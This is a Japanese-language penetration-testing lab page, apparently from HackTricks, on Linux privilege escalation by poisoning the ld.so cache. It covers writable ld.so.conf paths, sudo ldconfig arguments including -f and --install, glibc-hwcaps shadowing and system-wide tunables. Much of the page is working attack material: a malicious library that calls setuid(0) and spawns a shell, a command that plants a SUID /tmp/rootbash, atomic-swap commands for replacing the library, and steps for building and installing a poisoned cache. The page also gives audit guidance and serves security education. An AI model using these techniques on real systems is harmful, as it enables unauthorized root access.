# ld.so privesc exploit 例

{{#include ../../banners/hacktricks-training.md}}

このページは、**`/etc/ld.so.conf` または `ldconfig` を介して system linker cache を poisoning する**ことに特化した lab です。missing-library injection、writable `RPATH`/`RUNPATH`、`LD_PRELOAD`、その他の一般的な SUID linker abuse については、[SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) を参照してください。

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルの code を確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **作成**したファイルを、マシン上の同じフォルダーに配置します
2. **library**を**Compile**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**Copy**し、cacheを更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable**を**Compile**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_が_/usr/lib_から**ロード**されており、binaryを**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用なトリアージコマンド

実際のターゲットを攻撃する際は、バイナリが必要とする**正確なライブラリ名**、loaderが**現在解決している対象**、および稼働中のキャッシュを変更せずに書き込み可能な設定済みパスを確認してください。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` は**信頼できる** executable に対してのみ使用してください。一部の実装や通常とは異なる ELF interpreter では、attacker-controlled code が実行される可能性があります。`objdump -p ./file | grep NEEDED` は direct dependencies を安全に一覧表示します。信頼できる target では、検出した interpreter を `--list` とともに呼び出すことで、実際の resolution を確認できます。その出力を `--inhibit-cache --list` と比較してください。差異があれば、通常の search-path rule ではなく、`/etc/ld.so.cache` によって object が選択されたことが証明されます。<sup>[[1]](#references)[[4]](#references)</sup>

いくつかの有用な注意点：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常**機能しません**。redirection は現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** binaries は **secure-execution mode** で実行されます。`LD_LIBRARY_PATH`
は無視され、`LD_PRELOAD` には制限があります（slash を含む names は無視され、standard directories にある setuid-marked libraries のみ preloaded できます）。root が `ldconfig` を実行すると、`/etc/ld.so.conf` に記載された directories が `/etc/ld.so.cache` に追加される可能性があるため、この misconfiguration は依然として privileged programs に影響を与えることがあります。<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` も、`/etc/suid-debug` が存在しない限り secure-execution mode では無視されます。そのため、privileged execution からの output を期待するのではなく、同等の non-SUID run から trace を取得してください。<sup>[[1]](#references)</sup>
- glibc 2.33 以降では、dynamic loader は `--list-diagnostics` も提供します。これは、hijack が期待どおりに動作しない場合に、machine-readable な loader diagnostics と built-in search-path information を出力します。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache と SONAME の制約

`ldconfig` は configured directory 内の任意の file をすべて cache するわけではありません。ELF headers を調査し、`lib*.so*` または `ld-*.so*` に一致する names を認識し、一般的な `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain を期待します。したがって injected object には、target architecture/class、正確な `DT_NEEDED` name（通常はその `DT_SONAME`）、および victim が resolve するすべての symbols/versions が必要です。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
この例のように、target-specific libraryを優先してください。不完全なobjectで一般的なSONAMEをshadowingすると、意図したprivileged targetが実行される前にそのSONAMEをresolveするすべてのprocessが壊れる可能性があります。<sup>[[3]](#references)</sup>

### Cached-path persistence and atomic swaps

cacheには、**library nameからpathnameへの**mappingが記録されます。shared object自体が埋め込まれるわけではありません。attacker-controlled pathnameがcacheされた後、その正確なpathにあるobjectを置き換えると、別の`ldconfig`実行なしで、新しく起動するprocessに影響を与えられます。これにより、有用なtime-of-check/time-of-useパターンが可能になります。管理者によるcacheの再構築または検査中は有効なlibraryを公開し、その後payloadをatomicにrenameして上書きします。既存のprocessは、すでにmapされているobjectを保持します。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
同様に、`ld.so.conf` から悪意のある行を削除しても、それだけでは既に書き込まれたエントリは削除されません。管理者は、信頼できないオブジェクトを削除し、所有者と書き込みアクセスを修正して、キャッシュを再構築する必要があります。上記の `--inhibit-cache` による比較を使用して、古いキャッシュエントリと、現在も有効な設定パスを区別してください。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

このシナリオでは、管理者が、システムの
`/etc/ld.so.conf` によって include される `/etc/ld.so.conf.d/` 配下のファイルに、脆弱なエントリを追加したとします。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダは _/home/ubuntu/lib_（書き込みアクセス権があります）です。\
そのパス内で次のコードを**Download and compile**してください：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行することを想定している場合は、通常、インタラクティブシェルを起動するのではなく、**root 所有の artifact** を残す方が適切です。例:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、privileged execution が発生したら、`/tmp/rootbash -p` を使用できます。

**misconfigured な** path 内に悪意のある libcustom library を**作成した**ため、default cache は、privileged な **`ldconfig`** の実行が成功した後に再構築される必要があります。reboot は、ローカルの boot process が実際にそれを呼び出す場合にのみ有効です。それ以外の場合は、administrator の操作を待つか、利用可能であれば unsafe な sudo rule を使用してください。<sup>[[2]](#references)</sup>

これが発生したら、`sharedvuln` executable が `libcustom.so` library をどこから load しているかを**再確認**します：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、これは **`/home/ubuntu/lib` からロードされており**、いずれかのユーザーがこれを実行すると、shell が実行されます。
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ privileges を escalate していませんが、実行される commands を変更し、**root またはその他の privileged user が vulnerable binary を実行するのを待つ**ことで、privileges を escalate できます。

### Modern `glibc-hwcaps` shadowing

glibc 2.33 以降、loader は **すべての library search directory** 内にある `glibc-hwcaps/<level>/` 以下の optimized libraries を優先できます。そのため、`/home/ubuntu/lib` だけを確認するのは不十分です。`/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` のような writable な compatible subdirectory は、`ldconfig` によって index 化されると base library を shadow できます。一方、その他の CPU では base object が引き続き使用されます。これにより、別の CPU 上で validation が行われた場合に見落とされる可能性がある、architecture-selective な hijack も実現できます。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
現在の glibc hardening guidance では、重複する SONAME、デフォルト以外の検索場所、および `glibc-hwcaps` サブdirectory 内の object を避けることが推奨されています。audit の観点では、設定された directory とその親 path components に対して、所有権および書き込み可能性のチェックを再帰的に適用してください。<sup>[[3]](#references)</sup>

### その他の misconfigurations - Same vuln

前の例では、管理者が **`/etc/ld.so.conf.d/` 内の configuration file に、非特権の folder を設定した** という misconfiguration を偽装しました。\
しかし、同じ vulnerability を引き起こす可能性がある misconfiguration は他にもあります。ロードされる **config file** に対する **write permissions** がある場合、書き込み可能な `/etc/ld.so.conf.d/` directory 内に file を作成できる場合、または `/etc/ld.so.conf` に書き込める場合は、同じ vulnerability を設定して exploit できます。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。`ldconfig` は scan directories を positional arguments として受け取るため、cache-poisoning の最短形式は、多くの場合、単純に次のようになります。<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
また、`-f` はデフォルトのキャッシュ出力を維持したまま、別の設定ファイルを選択します。これは、引数フィルターが位置指定ディレクトリをブロックする一方で `-f` は許可する場合や、複数のパスを注入する必要がある場合に便利です。<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
では、**previous exploit** で示したように、悪意のあるライブラリを `/tmp` 内に作成します。\
最後に、パスを読み込み、バイナリがどこからライブラリを読み込んでいるかを確認します：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo privileges があれば、同じ vulnerability を exploit できます。** 制限された sudo rule を評価する際は、option の詳細が重要です。`-f` は別の configuration を選択しますが、それでも `/etc/ld.so.cache` を再構築します。`-C` は cache の保存先を別の場所へ redirect します。`-N` は cache の再構築を防ぎます。`-X` は link の更新を防ぎますが、**`-N` と組み合わせない限り、cache は再構築します**。`-n` は `-N` を意味するため、指定された directory 内の link は更新できますが、cache を poison することはできません。`-r` は別の root 配下で動作し、通常は host の cache を変更しません。<sup>[[2]](#references)</sup>

### glibc 2.44: prebuilt cache のインストール

Glibc 2.44 では `ldconfig --install SOURCE` が追加されました。これは prebuilt cache を、選択された cache の保存先（`-C` または `-r` によって変更されない限り、host の `/etc/ld.so.cache`）へ atomic にコピーします。これにより、sudoers rule や privileged wrapper に対する別の危険な argument が生じます。attacker は **privileges なしで** valid な cache を作成し、許可された `--install` invocation を使って system cache を置き換えられます。install path は cache magic をチェックしますが、trusted configuration から entries を再生成することはありません。<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
キャッシュには**library bytes**ではなく**pathnames**が含まれているため、victim の起動時に `/tmp/libcustom.so` が存在し、互換性を保っている必要があります。したがって、`-f`、位置引数のディレクトリ、または `-t` だけを拒否するFilterは、glibc 2.44では不十分です。`--install`/`-I`も拒否するか、できれば`ldconfig`への委譲自体を行わないでください。<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: system-wide tunablesのキャッシュ

glibc 2.44以降、`ldconfig`は`/etc/tunables.conf`も解析し、その設定を`/etc/ld.so.cache`の拡張として保存します。このファイルは`include`ディレクティブとプロセス単位のFilterを受け付けます。Prefixによって適用範囲を制御します。`@`/`onlysecure`は`AT_SECURE`プロセスのみを対象とし、`$`/`nonsecure`はそれらを除外し、`*`/`anysecure`は両方を対象とします。**Prefixのないエントリは、デフォルトでnon-secureプロセスに適用されます**。そのため、attackerがsetuid、setgid、またはcapabilityで権限昇格されたプログラムに影響を与えるには、明示的に`@`または`*`を使用する必要があります。これにより、auditの境界はlibrary directoriesを超えて拡大します。書き込み可能なtunables設定、またはそこからincludeされたファイルは、privilegedなcache rebuild後に、今後起動するプログラムへ影響を与える可能性があります。<sup>[[7]](#references)[[9]](#references)</sup>

同じreleaseでは、通常のcacheへの書き込みを継続しながら別のtunablesファイルを選択する`ldconfig -t TUNCONF`も追加されています（別のoptionによって変更される場合を除きます）。そのため、`-f`のみをblockしようとしたwrapperやsudo ruleでは、`-t`、任意の位置引数ディレクトリ、`--install`、およびcache outputの操作も拒否する必要があります。<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### ターゲット選択型 tunables

`[proc:PATTERN]` フィルターは、実行可能ファイルの完全な `/proc/self/exe` パス（`PATTERN` が `/` で始まる場合）または basename が一致する場合にのみ、以下のエントリを適用します。フィルターは、次のフィルター、`[]`、ファイルの末尾、または include-file の境界で終了します。これにより、変更された動作を 1 つの特権 victim に制限できるため、poisoned cache によるノイズを軽減できます。<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
`-`/`nonoverridable` prefixは、`GLIBC_TUNABLES`がcached valueをoverrideするのを防ぎます。`+`/`overridable`は通常のoverride動作を復元します。`AT_SECURE`プロセスでは、いずれにせよ環境変数は完全に無視されます。file formatはversion-specificなものとして扱ってください。glibc projectはこれをstable interfaceとして保証していません。targeted effectを試みる前に、`"$interp" --list-tunables`でサポートされているnameとvalueを列挙してください。<sup>[[7]](#references)[[9]](#references)</sup>

これは自動的にarbitrary code executionになるわけではありません。これはprivilegedな**loader-behavior manipulation** primitiveです。glibcは、system-wide valueによって、per-tunable security screeningなしにsecurity-sensitive tunableがsetuid/setgid programへ適用される可能性があると明示的に警告しています。universal payloadを想定するのではなく、target固有のallocator変更、CPU-hardeningの変更、またはdenial-of-service conditionを探してください。<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
